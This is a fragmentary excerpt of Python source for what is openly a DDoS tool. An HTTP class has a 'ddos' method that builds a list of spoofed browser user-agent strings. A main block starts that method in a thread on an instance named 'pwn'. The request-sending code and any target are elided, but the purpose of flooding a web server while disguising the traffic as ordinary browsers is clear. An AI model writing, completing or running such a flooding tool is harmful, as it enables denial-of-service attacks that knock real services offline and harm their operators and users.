...
""")
    def ddos(self):
        agents = ['Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; de) Opera 8.0','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; de) Opera 8.02','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; en) Opera 8.0','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; en) Opera 8.02','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; en) Opera 8.52','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; en) Opera 8.53','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; en) Opera 8.54',
...
if __name__ == '__main__':
    pwn = HTTP()
    ACCEPT_THREAD = Thread(target=pwn.ddos)
    ACCEPT_THREAD.start()
    ACCEPT_THREAD.join()
